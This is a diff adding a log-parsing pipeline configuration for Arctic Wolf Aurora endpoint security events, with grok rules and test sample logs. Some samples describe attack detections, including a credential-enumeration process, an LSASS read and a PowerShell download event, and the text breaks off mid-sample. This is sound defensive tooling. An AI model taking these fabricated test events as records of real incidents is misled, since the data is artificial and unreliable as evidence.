@@ -1,0 +1,1423 @@
+id: arctic-wolf-aurora-endpoint-security
+metric_id: arctic-wolf-aurora-endpoint-security
+backend_only: false
+facets:
+  - groups:
+      - Web Access
+    name: Browser
+    path: http.useragent_details.browser.family
+    source: log
+  - groups:
+      - Web Access
+    name: Device
+    path: http.useragent_details.device.family
+    source: log
+  - groups:
+      - Web Access
+    name: OS
+    path: http.useragent_details.os.family
+    source: log
+  - groups:
+      - Geoip
+    name: City Name
+    path: network.client.geoip.city.name
+    source: log
+  - groups:
+      - Geoip
+    name: Continent Code
+    path: network.client.geoip.continent.code
+    source: log
+  - groups:
+      - Geoip
+    name: Continent Name
+    path: network.client.geoip.continent.name
+    source: log
+  - groups:
+      - Geoip
+    name: Country ISO Code
+    path: network.client.geoip.country.iso_code
+    source: log
+  - groups:
+      - Geoip
+    name: Country Name
+    path: network.client.geoip.country.name
+    source: log
+  - groups:
+      - Geoip
+    name: Subdivision ISO Code
+    path: network.client.geoip.subdivision.iso_code
+    source: log
+  - groups:
+      - Geoip
+    name: Subdivision Name
+    path: network.client.geoip.subdivision.name
+    source: log
+  - groups:
+      - Geoip
+    name: Destination City Name
+    path: network.destination.geoip.city.name
+    source: log
+  - groups:
+      - Geoip
+    name: Destination Continent Code
+    path: network.destination.geoip.continent.code
+    source: log
+  - groups:
+      - Geoip
+    name: Destination Continent Name
+    path: network.destination.geoip.continent.name
+    source: log
+  - groups:
+      - Geoip
+    name: Destination Country ISO Code
+    path: network.destination.geoip.country.iso_code
+    source: log
+  - groups:
+      - Geoip
+    name: Destination Country Name
+    path: network.destination.geoip.country.name
+    source: log
+  - groups:
+      - Geoip
+    name: Destination Subdivision ISO Code
+    path: network.destination.geoip.subdivision.iso_code
+    source: log
+  - groups:
+      - Geoip
+    name: Destination Subdivision Name
+    path: network.destination.geoip.subdivision.name
+    source: log
+  - groups:
+      - User
+    name: User Name
+    path: usr.name
+    source: log
+  - groups:
+      - Web Access
+    name: Destination IP
+    path: network.destination.ip
+    source: log
+  - groups:
+      - Web Access
+    name: Destination Port
+    path: network.destination.port
+    source: log
+  - groups:
+      - Web Access
+    name: Client IP
+    path: network.client.ip
+    source: log
+  - groups:
+      - Web Access
+    name: Client Port
+    path: network.client.port
+    source: log
+  - groups:
+      - Web Access
+    name: User-Agent
+    path: http.useragent
+    source: log
+  - groups:
+      - Event
+    name: Event Name
+    path: evt.name
+    source: log
+pipeline:
+  type: pipeline
+  name: Arctic Wolf Aurora Endpoint Security
+  enabled: true
+  filter:
+    query: source:arctic-wolf-aurora-endpoint-security
+  processors:
+    - type: date-remapper
+      name: Define `syslog.timestamp` as the official date of the log
+      enabled: true
+      sources:
+        - syslog.timestamp
+    - type: grok-parser
+      name: Parse common log format
+      enabled: true
+      source: message
+      samples:
+        - 'Tenant ID: 82ee77a2-76a6-4d8f-97de-231bd4d5a4f4, Tenant Name:
+          TenantTest, Event Type: AuditLog, Event Name: LoginFailure, Message:
+          {"data":[["Cylance Administrator Password","One-Time
+          Password"]],"clientIp":"163.116.205.115"}, User: John Carter
+          (john.carter@testdata.ai), Eco Id: AqplNaZ7IyIQjDzBguyH5Ba='
+        - 'Tenant Name: TenantTest, Event Type: AuditLog, Event Name:
+          LoginFailure, Message: {"data":[["Cylance Administrator
+          Password","One-Time Password"]],"clientIp":"163.116.205.115"}, User:
+          John Carter (john.carter@testdata.ai), Eco Id:
+          AqplNaZ7IyIQjDzBguyH5Ba='
+        - 'Event Type: AuditLog, Event Name: LoginFailure, Message:
+          {"data":[["Cylance Administrator Password","One-Time
+          Password"]],"clientIp":"163.116.205.115"}, User: John Carter
+          (john.carter@testdata.ai), Eco Id: AqplNaZ7IyIQjDzBguyH5Ba='
+        - 'Tenant ID: 82ee77a2-76a6-4d8f-97de-231bd4d5a4f4, Event Type:
+          AuditLog, Event Name: LoginFailure, Message: {"data":[["Cylance
+          Administrator Password","One-Time
+          Password"]],"clientIp":"163.116.205.115"}, User: John Carter
+          (john.carter@testdata.ai), Eco Id: AqplNaZ7IyIQjDzBguyH5Ba='
+        - "Event Name: OpticsCaeApiEvent, Device Name: SECURITYSERVER3, Zone
+          Names: (ZoneOne,ZoneTwo), Event Id:
+          d29ee101-a2a2-42f1-b9ab-7e4b18aeeef1, Severity: High, Description:
+          Test - API Sensor, High priority event, Instigating Process Name:
+          IReadCredentials.exe, Instigating Process Owner:
+          PENTEST//Administrator, Instigating Process ImageFileSha256:
+          E24F5A2B51EC1C260388348AF764B8794CE0566749F5801D024B7B422C63DC56,
+          Event Timestamp: 2022-09-28T14:23:37.384Z, Event Received Timestamp:
+          2022-09-28T14:24:30Z, Device Last Reported Users:
+          (PENTEST\\Administrator), Zone Ids:
+          (F568A8A8E401470282C1FE98FDD1703A,F568A8A8E401470282C1FE98FDD1703A),
+          Detection Rule Id: be7403ca-a9f4-4aa7-ad6d-7c672bfa8fc8, Instigating
+          Process Command Line: IReadCredentials.exe, Instigating Process File
+          Path: c:\\apisensor\\ireadcredentials.exe, API DLL: Advapi32.dll, API
+          Function: CredEnumerateW, API Parameters: Unknown"
+      grok:
+        supportRules: PARSE_TILL_COMMA2 %{regex("[^,]*")}
+        matchRules: "parse_rule (Tenant ID: %{notSpace:tenant_id}, )?(Tenant Name:
+          %{PARSE_TILL_COMMA2:tenant_name}, )?(Event Type:
+          %{notSpace:event_type}, )?Event Name: %{PARSE_TILL_COMMA2:evt.name},
+          %{data:additional_details}"
+    - type: category-processor
+      name: Categorise `service` based on `event_type`
+      enabled: true
+      categories:
+        - filter:
+            query: "@event_type:(AuditLog OR AppControl OR Device OR DeviceControl OR
+              ExploitAttempt OR ScriptControl OR Threat OR
+              ThreatClassification)"
+          name: desktop-events
+        - filter:
+            query: "@event_type:(OpticsCaeProcessEvent OR OpticsCaeFileEvent OR
+              OpticsCaeRegistryEvent OR OpticsCaeNetworkEvent OR
+              OpticsCaeMemoryEvent OR OpticsCaeDnsEvent OR OpticsCaeLogEvent OR
+              OpticsCaePowershellTraceEvent OR OpticsCaeWmiEvent OR
+              OpticsCaeComEvent OR OpticsCaeHttpEvent)"
+          name: detection-events
+      target: service
+    - type: category-processor
+      name: Categorize `service` based on `evt.name` for Aurora Protect API Sensor
+        Desktop Events
+      enabled: true
+      categories:
+        - filter:
+            query: "@evt.name:OpticsCaeApiEvent"
+          name: detection-events
+      target: service
+    - type: service-remapper
+      name: Define `service` as the official service of the log
+      enabled: true
+      sources:
+        - service
+    - type: pipeline
+      name: Processing Aurora Protect Desktop Application Control Events
+      enabled: true
+      filter:
+        query: "@event_type:AppControl"
+      processors:
+        - type: grok-parser
+          name: Parsing Aurora Protect Desktop Application Control Events
+          enabled: true
+          source: additional_details
+          samples:
+            - "Device Name: Unknown (test1), IP Address: (10.0.0.0), Action: Deny,
+              Action Type: PE File Change, File Path: c:/test/test1, SHA256:
+              56D1590A0D04771A1D5DBDEBEC7D4609A22B42085CEC07F0CF63222668FA5092,
+              Zone Names: (Windows Zone (Default)), Device Id:
+              0929f443-2a56-46b3-bcfe-fc598da81d8a, Policy Name: Stage 3 - All
+              Threats AQT + Critical Exploit Prevention + Malicious Script
+              Prevention (Cylance Reference Policy)"
+            - "Device Name: WIN-7entSh64, IP Address: (10.0.0.0), Action:
+              Deny, Action Type: PEFileChange, File Path:
+              C:\\Users\\admin\\AppData\\Local\\Temp\\MyInstaller.exe, SHA256:
+              04D4DC02D96673ECA9050FE7201044FDB380E3CFE0D727E93DB35A709B45EDAB),
+              Zone Names: (Script Test,Server Test)"
+            - "Device Name: WIN-7entSh65, IP Address: (10.0.0.0), Action:
+              Deny, Action Type: PEFileChange, File Path:
+              \\\\shared1\\psexec.exe, SHA256:
+              F8DBABDFA03068130C277CE49C60E35C029FF29D9E3C74C362521F3FB02670D6),
+              Zone Names: (Script Test,Server Test)"
+          grok:
+            supportRules: PARSE_TILL_COMMA2 %{regex("[^,]*")}
+            matchRules: 'parse_appcontrol_rule Device Name:
+              %{PARSE_TILL_COMMA2:device_name}, IP Address:
+              %{notSpace:ip_addresses:array("()",",")}, Action:
+              (%{word:action})?, Action Type: %{PARSE_TILL_COMMA2:action_type},
+              File Path: %{PARSE_TILL_COMMA2:file_path}, SHA256:
+              (%{notSpace:sha256})?, Zone Names: %{data:zone_names}(, Device Id:
+              (%{notSpace:device_id})?)?(, Policy Name: %{data:policy_name})?'
+    - type: pipeline
+      name: Processing Aurora Protect Desktop Audit Events
+      enabled: true
+      filter:
+        query: "@event_type:AuditLog"
+      processors:
+        - type: grok-parser
+          name: Parsing Aurora Protect Desktop Audit Events
+          enabled: true
+          source: additional_details
+          samples:
+            - 'Message: {"data":[["Cylance Administrator Password","One-Time
+              Password"]],"clientIp":"163.116.205.115"}, User: John Carter
+              (john.carter@testdata.ai), Eco Id: AqplNaZ7IyIQjDzBguyH5Ba='
+            - "Message: Policy Assigned: Focus; Devices: DESKTOP-Q401L6N, User:
+              John Carter (john.carter@testdata.ai)"
+            - 'Message:
+              {"Enable":true,"Siem":"Other","UseSsl":false,"ServerAddress":"103.108.207.58","ServerPort":"9806","Protocol":"tcp","Severity":7,"Facility":16,"TenantIdentifierLogging":0,"EnableForAppControl":true,"EnableForAuditLog":true,"EnableForDevice":true,"EnableForExploitAttempt":true,"EnableForDeviceControl":true,"EnableForOptics":true,"EnableForThreat":true,"EnableForThreatClassification":true,"EnableForScriptControl":true,"EnableForMobileAlerts":true,"EnableForNetworkThreats":true,"EnableForDirectorySync":false,"EnableForAvert":true,"EnableForRiskAssessment":false,"EnableMessagesOver2KB":true,"EnableForCloudWorkload":false,"CustomToken":"","TenantPreferredNotificationEmails":null},
+              User: John Carter (john.carter@testdata.ai)'
+            - "Message: Device: IT’s MacBook Air was auto assigned to Zone: Mac
+              Zone (Default); Policy Changed: 'Default' to 'Stage 1 - Threat
+              Monitoring (Cylance Reference Policy)', User:"
+          grok:
+            supportRules: PARSE_TILL_COMMA %{regex("(.*)(?=,)")}
+            matchRules: "parse_audit_rule Message: %{PARSE_TILL_COMMA:message}, User:(
+              %{data:user})?(, Eco Id: %{notSpace:eco_id})?"
+    - type: pipeline
+      name: Processing Aurora Protect Desktop Device Events
+      enabled: true
+      filter:
+        query: "@event_type:Device"
+      processors:
+        - type: grok-parser
+          name: Parsing Aurora Protect Device Desktop Event
+          enabled: true
+          source: additional_details
+          samples:
+            - "Device Names: (AssetTag-EID,IT’s MacBook Air,
+              Test-E7E9A2EH1), Zone Name: test Devices, User: John Carter
+              (john.carter@testdata.ai)"
+            - "Device Name: AssetTag-EID, Zone Names: (zone1), Device Id:
+              b1f8e376-cee3-4319-a076-f587c51e68aa"
+            - "Device Names: (test1), User: John Carter (john.carter@testdata.ai),
+              Zone Names: (Mac Zone (Default)), Device Ids:
+              (4ce89db7-c31f-4279-a979-35d78548a674)"
+            - "Device Message: Renamed: 'default' to 'Unknown'; Policy Changed:
+              'Default' to 'IRVPolicy1'; Zones Added: 'IRV1', User: John Carter
+              (john.carter@testdata.ai), Zone Names: (Windows Zone (Default)),
+              Device Id: 4af77c47-6b60-4807-ad95-ddabad5f4529"
+            - "Device Name: Unknown (test1), Last Scan: 11/25/2025 09:39:31,
+              Next Scan: 11/26/2025 06:53:24"
+          grok:
+            supportRules: |-
+              PARSE_TILL_COMMA %{regex("(.*)(?=,)")}
+              PARSE_TILL_COMMA2 %{regex("[^,]*")}
+              PARSE_TILL_SINGLE_QUOTE %{regex("[^']*")}
+              PARSE_TILL_SEMI_COLON %{regex("[^;]*")}
+            matchRules: >-
+              parse_rule_device Device Message: Device:
+              %{PARSE_TILL_SEMI_COLON:device_name}(; Policy Changed:
+              '%{PARSE_TILL_SINGLE_QUOTE:previous_policy}' to
+              '%{PARSE_TILL_SINGLE_QUOTE:policy_name}')?(; Zones Added:
+              '%{PARSE_TILL_SINGLE_QUOTE:zones_added}')?, User:
+              %{PARSE_TILL_COMMA2:user}, Zone Names:
+              %{PARSE_TILL_COMMA:zone_names}, Device Id:
+              (%{notSpace:device_id})?
+
+              parse_rule_device1 Device Message: Device: %{PARSE_TILL_COMMA2:device_name}, User: %{PARSE_TILL_COMMA2:user}, Zone Names: %{PARSE_TILL_COMMA:zone_names}, Device Id: (%{notSpace:device_id})?
+
+              parse_rule_device2 Device Message: Renamed: '%{PARSE_TILL_SINGLE_QUOTE:previous_device}' to '%{PARSE_TILL_SINGLE_QUOTE:device_name}'(; Policy Changed: '%{PARSE_TILL_SINGLE_QUOTE:previous_policy}' to '%{PARSE_TILL_SINGLE_QUOTE:policy_name}')?(; Zones Added: '%{PARSE_TILL_SINGLE_QUOTE:zones_added}')?, User: %{PARSE_TILL_COMMA2:user}(, Zone Names: %{PARSE_TILL_COMMA:zone_names})?(, Device Id: %{notSpace:device_id})?
+
+              parse_rule_device3 Device Names: %{data:device_name:array("()",",")}, Zone Name: %{PARSE_TILL_COMMA2:zone_name}, User: %{data:user}
+
+              parse_rule_device4 Device Names: %{data:device_name:array("()",",")}(, Policy Name: %{PARSE_TILL_COMMA2:policy_name})?, User: %{PARSE_TILL_COMMA2:user}(, Zone Names: %{data:zone_names})?(, Device Ids: %{notSpace:device_ids:array("()",",")})?
+
+              parse_rule_device5 Device Name: %{PARSE_TILL_COMMA2:device_name}, Agent Version: %{PARSE_TILL_COMMA2:agent_version}, IP Address: %{notSpace:ip_addresses:array("()",",")}, MAC Address: %{notSpace:mac_addresses:array("()",",")}, Logged On Users: %{data:logged_on_users}, OS: %{PARSE_TILL_COMMA2:os}(, Kernel Version: %{PARSE_TILL_COMMA2:kernel_version})?(, Optics Version: %{PARSE_TILL_COMMA2:optics_version})?(, Zone Names: %{data:zone_names})?
+
+              parse_rule_device6 Device Name: %{PARSE_TILL_COMMA2:device_name}, Last Scan: %{data:last_scan}(, Next Scan: %{data:next_scan})?
+
+              parse_rule_device7 Device Name: %{data:device_name}(, Zone Names: %{data:zone_names})?(, Device Id: (%{notSpace:device_id})?)?
+    - type: pipeline
+      name: Processing Aurora Protect Desktop Device Control Events
+      enabled: true
+      filter:
+        query: "@event_type:DeviceControl"
+      processors:
+        - type: grok-parser
+          name: Parsing Aurora Protect Desktop Device Control Events
+          enabled: true
+          source: additional_details
+          samples:
+            - "Device Name: test, External Device Type: USBDrive, External Device
+              Vendor ID: 090B, External Device Name: USB Flash DISK USB Device,
+              External Device Product ID: 1001, External Device Serial Number:
+              1408033910001642, Zone Names: (Windows Zone (Default)), Device Id:
+              cf753b5b-6ce6-4648-b2df-a827d3560b6k, Policy Name: Stage 3 - All
+              Threats AQT + Critical Exploit Prevention + Malicious Script
+              Prevention (Cylance Reference Policy)"
+            - "Device Name: Test_Device_1, External Device Type: iOS, External
+              Device Vendor ID: 1959, External Device Name: Generic USB Drive -
+              2017/02/16-01, External Device Product ID: 0201, External Device
+              Serial Number: 575833314133343210041249, Zone Names:
+              (test_zone_02)"
+          grok:
+            supportRules: PARSE_TILL_COMMA2 %{regex("[^,]*")}
+            matchRules: "parse_device_control_rule Device Name:
+              %{PARSE_TILL_COMMA2:device_name}, External Device Type:
+              (%{notSpace:external_device_type})?, External Device Vendor ID:
+              (%{notSpace:external_device_vendor_id})?, External Device Name:
+              %{PARSE_TILL_COMMA2:external_device_name}, External Device Product
+              ID: (%{notSpace:external_device_product_id})?, External Device
+              Serial Number: (%{notSpace:external_device_serial_number})?, Zone
+              Names: %{data:zone_names}(, Device Id: %{notSpace:device_id})?(,
+              Policy Name: %{data:policy_name})?"
+    - type: pipeline
+      name: Processing Aurora Protect Desktop Memory Protection Events
+      enabled: true
+      filter:
+        query: "@event_type:ExploitAttempt"
+      processors:
+        - type: grok-parser
+          name: Parsing Aurora Protect Desktop Memory Protection Events
+          enabled: true
+          source: additional_details
+          samples:
+            - "Device Name: Unknown (test1), IP Address: (10.0.0.0), Action: Terminated,
+              Process ID: 18284, Process Name: SearchProtocolHost.exe, User
+              Name: , Violation Type: Direct System Calls, Zone Names: (Windows
+              Zone (Default)), Device Id: 0929f443-2a56-46b3-bcfe-fc598da81d8f,
+              Policy Name: Stage 3 - All Threats AQT + Critical Exploit
+              Prevention + Malicious Script Prevention (Cylance Reference
+              Policy)"
+            - "Device Name: WIN-7entSh64, IP Address: (10.0.0.0), Action:
+              Blocked, Process ID: 3806, Process Name: C:\\AttackTest64.exe,
+              User Name: admin, Violation Type: LSASS Read, Zone Names: (Script
+              Test,Server Test), Device ID:
+              e378dacb-9324-453a-b8c6-5a8406952199"
+          grok:
+            supportRules: |-
+              PARSE_TILL_COMMA %{regex("(.*)(?=,)")}
+              PARSE_TILL_COMMA2 %{regex("[^,]*")}
+            matchRules: 'parse_memory_protection_rule Device Name:
+              %{PARSE_TILL_COMMA2:device_name}, IP Address:
+              %{notSpace:ip_addresses:array("()",",")}, Action:
+              (%{notSpace:action})?, Process ID: (%{notSpace:process_id})?,
+              Process Name: %{PARSE_TILL_COMMA2:process_name}, User Name:
+              %{PARSE_TILL_COMMA2:usr.name}, Violation Type:
+              %{PARSE_TILL_COMMA2:violation_type}, Zone Names:
+              %{data:zone_names}(, Device Id: (%{notSpace:device_id})?)?(,
+              Policy Name: %{data:policy_name})?'
+    - type: pipeline
+      name: Processing Aurora Protect Desktop Script Control Events
+      enabled: true
+      filter:
+        query: "@event_type:ScriptControl"
+      processors:
+        - type: grok-parser
+          name: Parsing Aurora Protect Desktop Script Control Events
+          enabled: true
+          source: additional_details
+          samples:
+            - "Device Name: Unknown (test1), File Path: c:/test/test1, SHA256:
+              FEA0867AE0769D8858FFD94EA93EFBFE5C4531DB8CA75719D42BF074FE22F904,
+              Status: Unscored, Interpreter: Jscript, Interpreter Version:
+              10.0.22621.5993, Zone Names: (Windows Zone (Default)), User Name:
+              , Device Id: 0929f443-2a56-46b3-bcfe-fc598da81d8k, Policy Name:
+              Stage 3 - All Threats AQT + Critical Exploit Prevention +
+              Malicious Script Prevention (Cylance Reference Policy)"
+            - "Device Name: test, File Path: c:/test/test1, SHA256:
+              fe9b64defd8bf214c7490aa7f35b495a79a95e81f8943ee279dc99998d3d3449,
+              Status: Unscored, Interpreter: PowershellConsole, Interpreter
+              Version: 10.0.22621.2 (WinBuild.160101.0800), Zone Names: (Windows
+              Zone (Default)), User Name: test test (test.test@example.com), Device Id:
+              191c967b-264c-46c3-999b-94c071e2e792, Policy Name: Focus"
+            - "Device Name: test, File Path: c:/test/test1, SHA256:
+              fe9b64defd8bf214c7490aa7f35b495a79a95e81f8943ee279dc99998d3d3442,
+              Interpreter: PowershellConsole, Interpreter Version: 10.0.22661.1
+              (WinBuild.160101.0800), Zone Names: (Windows Zone (Default)), User
+              Name: test test (test.test@example.com), Device Id: 191c967b-264c-46c3-999b-94c071e2e792, Policy
+              Name: Focus"
+            - "Device Name: Fake_Device, File Path:
+              d:\\windows\\system32\\windowspowershell\\v2.1\\newlyMade.vbs,
+              SHA256:
+              FE9B64DEFD8BF214C7490BB7F35B495A79A95E81F8943EE279DC99998D3D3420,
+              Interpreter: active, Interpreter Version: 6.1.7600.16387
+              (win7_rtm.090714-1255), Zone Names: (Script Test,Server Test),
+              Device ID: e378dacb-9324-453a-b8c6-5a8406952195, Policy Name:
+              Default"
+          grok:
+            supportRules: |-
+              PARSE_TILL_COMMA %{regex("(.*)(?=,)")}
+              PARSE_TILL_COMMA2 %{regex("[^,]*")}
+            matchRules: "parse_script_control_rule Device Name:
+              %{PARSE_TILL_COMMA2:device_name}, File Path:
+              %{PARSE_TILL_COMMA2:file_path}, SHA256: (%{notSpace:sha256})?(,
+              Status: %{PARSE_TILL_COMMA2:script_control_status})?, Interpreter:
+              (%{notSpace:interpreter})?, Interpreter Version:
+              %{PARSE_TILL_COMMA2:interpreter_version}, Zone Names:
+              %{data:zone_names}(, User Name: %{PARSE_TILL_COMMA:user})?, Device
+              I(d|D): (%{notSpace:device_id})?, Policy Name:
+              %{data:policy_name}"
+    - type: pipeline
+      name: Processing of Aurora Protect Desktop Threat Events
+      enabled: true
+      filter:
+        query: "@event_type:Threat"
+      processors:
+        - type: grok-parser
+          name: Parsing Aurora Protect Desktop Threat Events
+          enabled: true
+          source: additional_details
+          samples:
+            - "Device Name: test, IP Address: (10.0.0.0), File Name: test1, Path: c:/test/test1, Drive Type:
+              Internal Hard Drive, SHA256:
+              1C7E66126306537A453D7A792978464AA8AD5AC2F34BD1FCCFFFE7E0B9C6D85A,
+              MD5: D2EBA7BA9D87AC9D902D39540C7854EA, Status: Quarantined,
+              Cylance Score: 100, Found Date: 11/18/2025 12:06:53 PM, File Type:
+              Executable, Is Running: False, Auto Run: False, Detected By:
+              FileWatcher, Zone Names: (Windows Zone (Default)), Is Malware:
+              True, Is Unique To Cylance: False, Threat Classification: Malware
+              - Trojan - msil/convagent, Device Id:
+              3daa966a-3b70-4a5a-90fd-33aee165ea1k, Policy Name: Focus"
+            - "Device Name: test, IP Address: (10.0.0.0), File Name: test1, Path: c:/test/test1, Drive Type:
+              Internal Hard Drive, SHA256:
+              93502C2277984F26EE5C0B7F74AA1045C5CF648F8511939CDAE130F051BCF7B2,
+              MD5: BA1D384701CD80CF80428F3729369582, Status: Default, Cylance
+              Score: 97, Found Date: 11/18/2025 12:48:16 PM, File Type:
+              Executable, Is Running: False, Auto Run: False, Detected By:
+              FileWatcher, Zone Names: (Windows Zone (Default)), Is Malware:
+              False, Is Unique To Cylance: False, Threat Classification:
+              UNCLASSIFIED, Device Id: 3daa966a-3b70-4a5a-90fd-33aee165ea1k,
+              Policy Name: Focus"
+            - "Device Name: test, IP Address: (10.0.0.0), File Name: test1, Path: c:/test/test1, Drive Type:
+              Internal Hard Drive, SHA256:
+              780BB152049A5921FABBE0DE066B53C36BF45D895B60B1651E35C69052E6703k,
+              MD5: EDF913F2D9993F003E5FE25BE9A48922, Status: FileRemoved,
+              Cylance Score: 95, Found Date: 11/18/2025 12:37:25 PM, File Type:
+              Executable, Is Running: False, Auto Run: False, Detected By:
+              FileWatcher, Zone Names: (Windows Zone (Default)), Is Malware:
+              False, Is Unique To Cylance: False, Threat Classification:
+              UNCLASSIFIED, Device Id: 3daa966a-3b70-4a5a-90fd-33aee165ea1k,
+              Policy Name: Focus"
+            - "Device Name: test, IP Address: (10.0.0.0), File Name: test1, Path: c:/test/test1, Drive Type:
+              Internal Hard Drive, SHA256:
+              FD4BB08C311EB04165C7DE20F21B2A4BF78776ABAB859448976BDE951BC8F592,
+              MD5: 2E2D79BAF18F763D0059ED1149871D78, Status: Quarantined,
+              Cylance Score: 100, Found Date: 11/18/2025 2:42:14 PM, File Type:
+              Executable, Is Running: False, Auto Run: False, Detected By:
+              FileWatcher, Zone Names: (Windows Zone (Default)), Is Malware:
+              False, Is Unique To Cylance: False, Threat Classification:
+              UNCLASSIFIED, Device Id: 3daa966a-3b70-4a5a-90fd-33aee165ea1k,
+              Policy Name: Focus"
+            - "Device Name: SH-Win81-1, IP Address: (10.3.0.132), File Name:
+              virusshare_00fbc4cc4b42774b50a9f71074b79bd9, Path:
+              c:\\ruby\\host_automation\\test\\data\\test_files\\, Drive Type:
+              None, File Owner: SH-Win81-1\\Exampleuser, SHA256:
+              1EBF3B8A61A7E0023AAB3B0CB24938536A1D87BCE1FCC6442E137FB2A7DD510B,
+              MD5: , Status: Unsafe, Cylance Score: 100, Found Date: 6/1/2015
+              10:57:42 PM, File Type: Executable, Is Running: False, Auto Run:
+              False, Detected By: FileWatcher, Zone Names: (Script Test,Server
+              Test), Is Malware: False, Is Unique to Cylance: False, Threat
+              Classification: File Unavailable"
+          grok:
+            supportRules: |-
+              PARSE_TILL_COMMA %{regex("(.*)(?=,)")}
+              PARSE_TILL_COMMA2 %{regex("[^,]*")}
+            matchRules: 'parse_threat_rule Device Name: %{PARSE_TILL_COMMA2:device_name}, IP
+              Address: %{notSpace:ip_addresses:array("()",",")}, File Name:
+              %{PARSE_TILL_COMMA2:file_name}, Path:
+              %{PARSE_TILL_COMMA2:file_path}, Drive Type:
+              %{PARSE_TILL_COMMA2:drive_type}(, File Owner:
+              %{PARSE_TILL_COMMA2:file_owner})?, SHA256: (%{notSpace:sha256})?,
+              MD5: (%{notSpace:md5})?, Status: (%{PARSE_TILL_COMMA2:Status})?, Cylance Score:
+              (%{integer:cylance_score})?, Found Date:
+              %{PARSE_TILL_COMMA2:found_date}, File Type:
+              %{PARSE_TILL_COMMA2:file_type}, Is Running: (%{word:is_running})?,
+              Auto Run: (%{word:auto_run})?, Detected By:
+              (%{notSpace:detected_by})?, Zone Names:
+              %{PARSE_TILL_COMMA:zone_names}, Is Malware: (%{word:is_malware})?,
+              Is Unique (t|T)o Cylance: (%{word:is_unique_to_cylance})?, Threat
+              Classification: %{data:threat_classification}(, Device Id:
+              %{notSpace:device_id})?(, Policy Name: %{data:policy_name})?'
+        - type: category-processor
+          name: Category processor for `file_state`
+          enabled: true
+          categories:
+            - filter:
+                query: "@cylance_score:[1 TO 59]"
+              name: Abnormal
+            - filter:
+                query: "@cylance_score:[60 TO 100]"
+              name: Unsafe
+          target: file_state
+    - type: pipeline
+      name: Processing Aurora Protect Desktop Threat Classification Events
+      enabled: true
+      filter:
+        query: "@event_type:ThreatClassification"
+      processors:
+        - type: grok-parser
+          name: Parsing Aurora Protect Desktop Threat Classification Events
+          enabled: true
+          source: additional_details
+          samples:
+            - "Threat Class: Malware, Threat Subclass: Dropper, Threat Family:
+              injuke, SHA256:
+              5B63698F6FC9FBEE366BD01AF6A383652B09FC1B136A3408EB4187FD3C12973B,
+              MD5: 30AD7FF97EEDC9D14F06F9A8C96DC067"
+            - "SHA256:
+              1218493137321C1D1F897B0C25BEF17CDD0BE9C99B84B4DD8B51EAC8F9794F67,
+              Threat Classification: Malware - Worm - QuKart"
+          grok:
+            supportRules: |-
+              PARSE_TILL_COMMA %{regex("(.*)(?=,)")}
+              PARSE_TILL_COMMA2 %{regex("[^,]*")}
+            matchRules: >-
+              rule1 Threat Class: %{PARSE_TILL_COMMA2:threat_class}, Threat
+              Subclass: %{PARSE_TILL_COMMA2:threat_subclass}, Threat Family:
+              %{PARSE_TILL_COMMA2:threat_family}, SHA256: (%{notSpace:sha256})?,
+              MD5: (%{notSpace:md5})?
+
+              rule2 SHA256: (%{notSpace:sha256})?, Threat Classification: %{data:threat_classification}
+    - type: pipeline
+      name: Processing Aurora Focus Process Based Detection Events
+      enabled: true
+      filter:
+        query: "@event_type:OpticsCaeProcessEvent"
+      processors:
+        - type: grok-parser
+          name: Parsing Aurora Focus Process Based Detection Events
+          enabled: true
+          source: additional_details
+          samples:
+            - "Device Name: ADMIN, Zone Names: (Windows Zone (Default)), Event
+              Id: 1ac592a3-357f-43b9-86f5-6f750f809a2k, Severity: Low,
+              Description: Application Shimming Persistence (MITRE), Instigating
+              Process Name: svchost.exe, Instigating Process Owner: NT
+              AUTHORITY//SYSTEM, Instigating Process ImageFileSha256:
+              949BFB5B4C7D58D92F3F9C5F8EC7CA4CEAFFD10EC5F0020F0A987C472D61C54A,
+              Event Timestamp: 2025-11-20T04:46:43.792Z, Event Received
+              Timestamp: 2025-11-20T04:46:51Z, Device Last Reported Users:
+              (admin\\test,Window Manager\\DWM-1,Window Manager\\DWM-2), Zone
+              Ids: (E79C47BC6292419DBD0AE117798FB352), Detection Rule Id:
+              5e5b01a7-2bdf-49c9-a58b-82703706a84k, Instigating Process Command
+              Line: C:\\Windows\\system32\\svchost.exe -k
+              LocalSystemNetworkRestricted -p -s PcaSvc, Instigating Process
+              File Path: c:\\windows\\system32\\svchost.exe, Target Process
+              Name: sdbinst.exe, Target Process Owner: NT AUTHORITY//SYSTEM,
+              Target Process ImageFileSha256:
+              7E6B42AF9D8B1E1A4EFDEEB152997C7C9BBFA010B2FCE65BEF29A2903819E0E6,
+              Device Id: 191c967b-264c-46c3-999b-94c071e2e792, Target Process
+              Command Line: C:\\Windows\\System32\\sdbinst.exe -m -bg, Target
+              Process File Path: c:\\windows\\system32\\sdbinst.exe"
+            - "Device Name: ADMIN, Zone Names: (Windows Zone (Default)), Event
+              Id: 72de5df2-5700-4977-9b66-580e6e697424, Severity: Low,
+              Description: Application Shimming Persistence (MITRE), Instigating
+              Process Name: svchost.exe, Instigating Process Owner: NT
+              AUTHORITY//SYSTEM, Instigating Process ImageFileSha256:
+              949BFB5B4C7D58D92F3F9C5F8EC7CA4CEAFFD10EC5F0020F0A987C472D61C54A,
+              Event Timestamp: 2025-11-19T21:46:33.166Z, Event Received
+              Timestamp: 2025-11-19T21:46:42Z, Device Last Reported Users:
+              (admin\\test,Window Manager\\DWM-1,Window Manager\\DWM-2), Zone
+              Ids: (E79C47BC6292419DBD0AE117798FB354), Detection Rule Id:
+              5e5b01a7-2bdf-49c9-a58b-82703706a84k, Instigating Process Command
+              Line: C:\\Windows\\system32\\svchost.exe -k
+              LocalSystemNetworkRestricted -p -s PcaSvc, Instigating Process
+              File Path: c:\\windows\\system32\\svchost.exe, Target Process
+              Name: sdbinst.exe, Target Process Owner: NT AUTHORITY//SYSTEM,
+              Target Process ImageFileSha256:
+              7E6B42AF9D8B1E1A4EFDEEB152997C7C9BBFA010B2FCE65BEF29A2903819E0E0,
+              Device Id: 191c967b-264c-46c3-999b-94c071e2e790, Target Process
+              Command Line: C:\\Windows\\System32\\sdbinst.exe -m -bg, Target
+              Process File Path: c:\\windows\\system32\\sdbinst.exe"
+            - "Device Name: SECURITYSERVER2, Zone Names: (Jeff Test), Event Id:
+              dbe47fda-f37b-42cc-a308-9675feb7e36a, Severity: High, Description:
+              Jeffs Take 2 Powershell Download, Instigating Process Name:
+              cmd.exe, Instigating Process Owner: PENTEST//Administrator,
+              Instigating Process ImageFileSha256:
+              935C1861DF1F4018D698E8B65ABFA02D7E9037D8F68CA3C2065B6CA165D44AD2,
